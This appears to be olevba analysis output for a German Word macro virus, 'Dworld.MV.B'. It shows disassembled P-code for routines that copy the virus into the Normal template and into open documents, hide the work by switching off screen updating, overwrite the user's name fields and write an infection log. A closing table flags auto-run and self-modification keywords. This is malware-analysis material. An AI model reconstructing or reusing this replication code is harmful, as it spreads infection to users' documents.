' 	LineCont 0x0010 02 00 01 00 06 00 01 00 14 00 01 00 18 00 01 00
' 	LitStr 0x0050 "<------------------------------------------------------------>                  "
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0029 "     Dwørld.MV.B hat Kontrolle über Word!"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0024 "  Programmiert von RinCeWinD ~[m@G]~"
' 	Add 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0025 "              DanKe aN: IarRaGØn<***>"
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0050 "<------------------------------------------------------------>                  "
' 	Concat 
' 	LitDI2 0x0040 
' 	LitStr 0x002F "                     Die m@gische Gilde ~[m@G]~"
' 	ArgsCall MsgBox 0x0003 
' Line #234:
' Line #235:
' 	EndSub 
' Line #236:
' Line #237:
' 	FuncDefn (Sub InfNormal())
' Line #238:
' Line #239:
' 	Ld DworldIns 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #240:
' Line #241:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St DN$ 
' Line #242:
' 	LitStr 0x0007 ":Dworld"
' 	St DW$ 
' Line #243:
' 	LitStr 0x0006 "Global"
' 	St G$ 
' Line #244:
' Line #245:
' 	OnError fehler_ 
' Line #246:
' Line #247:
' 	LitDI2 0x0000 
' 	St ScreenUpdating 
' Line #248:
' Line #249:
' 	Ld DN$ 
' 	Ld DW$ 
' 	Add 
' 	Ld G$ 
' 	Ld DW$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #250:
' Line #251:
' 	LitDI2 0x0001 
' 	St ScreenUpdating 
' Line #252:
' Line #253:
' 	LitStr 0x0010 "RinCeWinD~[m@G]~"
' 	Ld Application 
' 	MemSt UserName 
' Line #254:
' 	LitStr 0x0007 "~[m@G]~"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #255:
' 	LitStr 0x0021 "Kontakt: rincewind_mg@hotmail.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #256:
' Line #257:
' 	LitStr 0x001C "C:\WINDOWS\SYSTEM\DWORLD.INI"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #258:
' 	Ld Date$ 
' 	St a$ 
' Line #259:
' 	Ld Time$ 
' 	St B$ 
' Line #260:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St c$ 
' Line #261:
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006A "----------------------------------------------------------------------------------------------------------"
' 	PrintItemNL 
' Line #263:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "Erstinfektion mit Dworld.MV.B am: "
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0004 " um "
' 	Add 
' 	Ld B$ 
' 	Add 
' 	LitStr 0x0007 " durch "
' 	Add 
' 	Ld c$ 
' 	Add 
' 	PrintItemNL 
' Line #264:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006A "----------------------------------------------------------------------------------------------------------"
' 	PrintItemNL 
' Line #265:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Programmiert von RinCeWinD~[m@G]~ aka zWeiBLuM<BeTa>"
' 	PrintItemNL 
' Line #266:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Kontakt: Rincewind_mg@hotmail.com"
' 	PrintItemNL 
' Line #267:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 " ---------------------------------------------------"
' 	PrintItemNL 
' Line #268:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "|Danke an LzØ (besonders IarRagøN & LRay), BeTa CreW|"
' 	PrintItemNL 
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "|und alle die mich kennen!                          |"
' 	PrintItemNL 
' Line #270:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "|FöRDERT EURE LOKALE SZENE!                         |"
' 	PrintItemNL 
' Line #271:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 " ---------------------------------------------------"
' 	PrintItemNL 
' Line #272:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #273:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Weitere Infektionen:"
' 	PrintItemNL 
' Line #274:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x006A "----------------------------------------------------------------------------------------------------------"
' 	PrintItemNL 
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "DateiName:         Datum:          Uhrzeit:"
' 	PrintItemNL 
' Line #276:
' Line #277:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #278:
' Line #279:
' 	EndIfBlock 
' Line #280:
' 	Label fehler_ 
' Line #281:
' 	EndSub 
' Line #282:
' 	FuncDefn (Sub InfDok())
' Line #283:
' Line #284:
' 	Ld xDworldIns 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #285:
' Line #286:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St DN$ 
' Line #287:
' 	LitStr 0x0007 ":Dworld"
' 	St DW$ 
' Line #288:
' 	LitStr 0x0006 "Global"
' 	St G$ 
' Line #289:
' Line #290:
' 	OnError xfehler_ 
' Line #291:
' Line #292:
' 	LitDI2 0x0000 
' 	St ScreenUpdating 
' Line #293:
' Line #294:
' 	Ld G$ 
' 	Ld DW$ 
' 	Add 
' 	Ld DN$ 
' 	Ld DW$ 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #295:
' Line #296:
' 	LitDI2 0x0001 
' 	St ScreenUpdating 
' Line #297:
' Line #298:
' 	ArgsCall (Call) DworldInfo 0x0000 
' Line #299:
' Line #300:
' 	EndIfBlock 
' Line #301:
' Line #302:
' 	Label xfehler_ 
' Line #303:
' 	EndSub 
' Line #304:
' Line #305:
' 	FuncDefn (Function DworldIns())
' Line #306:
' 	LitDI2 0x0000 
' 	St DworldIns 
' Line #307:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St MZ 
' Line #308:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MZ 
' 	For 
' Line #309:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Dworld"
' 	Eq 
' 	IfBlock 
' Line #310:
' 	LitDI2 0x0001 
' 	UMi 
' 	St DworldIns 
' Line #311:
' 	EndIfBlock 
' Line #312:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #313:
' 	EndFunc 
' Line #314:
' Line #315:
' 	FuncDefn (Function xDworldIns())
' Line #316:
' 	LitDI2 0x0000 
' 	St xDworldIns 
' Line #317:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St xMZ 
' Line #318:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld xMZ 
' 	For 
' Line #319:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Dworld"
' 	Eq 
' 	IfBlock 
' Line #320:
' 	LitDI2 0x0001 
' 	UMi 
' 	St xDworldIns 
' Line #321:
' 	EndIfBlock 
' Line #322:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #323:
' 	EndFunc 
' Line #324:
' Line #325:
' Line #326:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

